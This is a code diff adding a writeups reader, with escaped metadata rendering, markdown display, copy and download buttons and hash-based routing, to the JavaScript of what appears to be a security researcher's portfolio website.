+                // Populate Metadata Header Box
+                const metaBox = document.getElementById('readerMetaBox');
+                metaBox.innerHTML =
+                    '<div class="mb-4 flex flex-wrap items-center gap-2">' +
+                        '<span class="rounded-md border px-2.5 py-1 font-mono text-xs font-bold uppercase tracking-wider ' + severityBadgeStyle(w.severity) + '">' + escapeHtml(w.severity) + '</span>' +
+                        '<span class="rounded-md border border-neonCyan/30 bg-neonCyan/10 px-2.5 py-1 font-mono text-xs text-neonCyan">' + escapeHtml(w.category) + '</span>' +
+                        '<span class="ml-auto font-mono text-xs text-slate-400">' + escapeHtml(w.date) + '</span>' +
+                    '</div>' +
+                    '<div class="grid grid-cols-1 gap-3 border-t border-borderDark pt-4 font-mono text-xs sm:grid-cols-2 lg:grid-cols-4">' +
+                        '<div class="rounded-xl border border-borderDark bg-obsidian/80 p-3">' +
+                            '<div class="text-[10px] uppercase text-slate-400">Target</div>' +
+                            '<div class="mt-1 font-semibold text-white">' + escapeHtml(w.target) + '</div>' +
+                        '</div>' +
+                        '<div class="rounded-xl border border-borderDark bg-obsidian/80 p-3">' +
+                            '<div class="text-[10px] uppercase text-slate-400">CWE</div>' +
+                            '<div class="mt-1 font-semibold text-amber-300">' + escapeHtml(w.cwe) + '</div>' +
+                        '</div>' +
+                        '<div class="rounded-xl border border-borderDark bg-obsidian/80 p-3">' +
+                            '<div class="text-[10px] uppercase text-slate-400">Date</div>' +
+                            '<div class="mt-1 font-semibold text-neonCyan">' + escapeHtml(w.date) + '</div>' +
+                        '</div>' +
+                        '<div class="rounded-xl border border-borderDark bg-obsidian/80 p-3">' +
+                            '<div class="text-[10px] uppercase text-slate-400">Source File</div>' +
+                            '<div class="mt-1 font-semibold text-neonEmerald">' + escapeHtml(w.file) + '</div>' +
+                        '</div>' +
+                    '</div>';
+
+                // Safely render Markdown body using the linear-time parser
+                const readerBody = document.getElementById('readerBody');
+                readerBody.innerHTML = renderMarkdownSafe(w.markdown);
+
+                // Attach one-click Copy handlers to every code block
+                readerBody.querySelectorAll('.md-copy-btn').forEach(btn => {
+                    btn.addEventListener('click', () => {
+                        const raw = decodeURIComponent(btn.getAttribute('data-copy-code') || '');
+                        copyToClipboard(raw, 'Code snippet copied to clipboard!');
+                    });
+                });
+
+                // Attach graceful onerror fallback placeholders for relative Screenshots/ paths
+                readerBody.querySelectorAll('.md-proof-img').forEach(img => {
+                    img.addEventListener('error', () => {
+                        const path = img.getAttribute('data-expected-path') || img.getAttribute('src') || '';
+                        const alt = img.getAttribute('alt') || 'Proof Screenshot';
+                        const fallback = document.createElement('div');
+                        fallback.className = 'flex flex-col items-center justify-center gap-2 bg-obsidian/90 px-6 py-10 text-center';
+                        fallback.innerHTML =
+                            '<svg class="h-8 w-8 text-slate-500" fill="none" stroke="currentColor" stroke-width="1.6" viewBox="0 0 24 24">' +
+                                '<path stroke-linecap="round" stroke-linejoin="round" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z" />' +
+                            '</svg>' +
+                            '<p class="font-mono text-xs font-semibold text-neonCyan">' + escapeHtml(path) + '</p>' +
+                            '<p class="max-w-md text-xs text-slate-400">' + escapeHtml(alt) + ' — renders automatically when hosted alongside the <code class="inline-code">Screenshots/</code> folder.</p>';
+                        img.replaceWith(fallback);
+                    }, { once: true });
+                });
+
+                window.scrollTo({ top: 0, behavior: 'auto' });
+            }
+
+            // Writeups search input
+            const writeupSearch = document.getElementById('writeupSearch');
+            if (writeupSearch) {
+                writeupSearch.addEventListener('input', e => {
+                    searchQuery = e.target.value.trim();
+                    renderWriteupsHub();
+                });
+            }
+
+            // Reader action buttons
+            const backToWriteupsBtn = document.getElementById('backToWriteupsBtn');
+            if (backToWriteupsBtn) {
+                backToWriteupsBtn.addEventListener('click', () => navigateToHash('#writeups'));
+            }
+
+            const copyWriteupLinkBtn = document.getElementById('copyWriteupLinkBtn');
+            if (copyWriteupLinkBtn) {
+                copyWriteupLinkBtn.addEventListener('click', () => {
+                    copyToClipboard(window.location.href, 'Writeup link copied!');
+                });
+            }
+
+            const downloadWriteupMdBtn = document.getElementById('downloadWriteupMdBtn');
+            if (downloadWriteupMdBtn) {
+                downloadWriteupMdBtn.addEventListener('click', () => {
+                    if (!currentWriteup) return;
+                    const blob = new Blob([currentWriteup.markdown], { type: 'text/markdown;charset=utf-8' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = currentWriteup.file || (currentWriteup.id + '.md');
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+                    showToast('Downloading ' + (currentWriteup.file || (currentWriteup.id + '.md')));
+                });
+            }
+
+            /* =========================================================================
+             *  MOBILE MENU & SAFE NON-RECURSIVE HASH ROUTING
+             * ========================================================================= */
             const mobileMenuBtn = document.getElementById('mobileMenuBtn');
             const mobileMenu = document.getElementById('mobileMenu');
             const menuIconOpen = document.getElementById('menuIconOpen');
             const menuIconClose = document.getElementById('menuIconClose');
 
-            function toggleMobileMenu(forceClose = false) {
-                const isHidden = mobileMenu.classList.contains('hidden');
-                const shouldOpen = forceClose ? false : isHidden;
-                mobileMenu.classList.toggle('hidden', !shouldOpen);
-                menuIconOpen.classList.toggle('hidden', shouldOpen);
-                menuIconClose.classList.toggle('hidden', !shouldOpen);
-                mobileMenuBtn.setAttribute('aria-expanded', String(shouldOpen));
+            function closeMobileMenu() {
+                if (!mobileMenu) return;
+                mobileMenu.classList.add('hidden');
+                mobileMenuBtn.setAttribute('aria-expanded', 'false');
+                menuIconOpen.classList.remove('hidden');
+                menuIconClose.classList.add('hidden');
             }
 
             if (mobileMenuBtn) {
-                mobileMenuBtn.addEventListener('click', () => toggleMobileMenu());
+                mobileMenuBtn.addEventListener('click', () => {
+                    const isHidden = mobileMenu.classList.toggle('hidden');
+                    mobileMenuBtn.setAttribute('aria-expanded', String(!isHidden));
+                    menuIconOpen.classList.toggle('hidden', !isHidden);
+                    menuIconClose.classList.toggle('hidden', isHidden);
+                });
             }
+
             document.querySelectorAll('.mobile-nav-link').forEach(link => {
-                link.addEventListener('click', () => toggleMobileMenu(true));
+                link.addEventListener('click', closeMobileMenu);
             });
 
-            /* ---------- 8. Active Navigation Section Indicator ---------- */
+            const portfolioView = document.getElementById('portfolioView');
+            const writeupsView = document.getElementById('writeupsView');
+            const writeupsHub = document.getElementById('writeupsHub');
+            const writeupReader = document.getElementById('writeupReader');
             const navLinks = document.querySelectorAll('.nav-link');
-            const sections = ['home', 'about', 'skills', 'projects', 'contact']
-                .map(id => document.getElementById(id))
-                .filter(Boolean);
 
-            if ('IntersectionObserver' in window && sections.length) {
-                const observer = new IntersectionObserver((entries) => {
+            function setActiveNav(href) {
+                navLinks.forEach(link => {
+                    link.classList.toggle('active', link.getAttribute('href') === href);
+                });
+            }
+
+            function navigateToHash(newHash) {
+                if (window.location.hash !== newHash) {
+                    window.location.hash = newHash;
+                } else {
+                    route();
+                }
+            }
+
+            function route() {
+                const hash = window.location.hash || '#home';
+                closeMobileMenu();
+
+                if (hash === '#writeups' || hash.startsWith('#writeups/')) {
+                    portfolioView.classList.add('hidden');
+                    writeupsView.classList.remove('hidden');
+                    setActiveNav('#writeups');
+
+                    if (hash.startsWith('#writeups/') && hash.length > '#writeups/'.length) {
+                        const slug = decodeURIComponent(hash.slice('#writeups/'.length));
+                        openWriteup(slug);
+                    } else {
+                        currentWriteup = null;
+                        writeupReader.classList.add('hidden');
+                        writeupsHub.classList.remove('hidden');
+                        renderWriteupFilterPills();
+                        renderWriteupsHub();
+                        window.scrollTo({ top: 0, behavior: 'auto' });
+                    }
+                    return;
+                }
+
+                // Main portfolio view
+                writeupsView.classList.add('hidden');
+                portfolioView.classList.remove('hidden');
+
+                let targetEl = null;
+                try {
+                    targetEl = document.querySelector(hash);
+                } catch (err) {
+                    targetEl = null;
+                }
+
+                if (targetEl) {
+                    setActiveNav(hash);
+                    requestAnimationFrame(() => targetEl.scrollIntoView({ behavior: 'smooth' }));
+                } else {
+                    setActiveNav('#home');
+                    window.scrollTo({ top: 0, behavior: 'auto' });
+                }
+            }
+
+            window.addEventListener('hashchange', route);
+            route();
+
+            // Scroll Spy for main portfolio sections
+            if ('IntersectionObserver' in window) {
+                const sections = document.querySelectorAll('#portfolioView section[id]');
+                const observer = new IntersectionObserver(entries => {
+                    if (portfolioView.classList.contains('hidden')) return;
                     entries.forEach(entry => {
                         if (entry.isIntersecting) {
-                            const id = entry.target.getAttribute('id');
-                            navLinks.forEach(link => {
-                                const isMatch = link.getAttribute('href') === `#${id}`;
-                                link.classList.toggle('active', isMatch);
-                            });
+                            setActiveNav('#' + entry.target.id);
                         }
                     });
-                }, { rootMargin: '-40% 0px -50% 0px' });
+                }, { rootMargin: '-35% 0px -55% 0px' });
 
                 sections.forEach(sec => observer.observe(sec));
             }
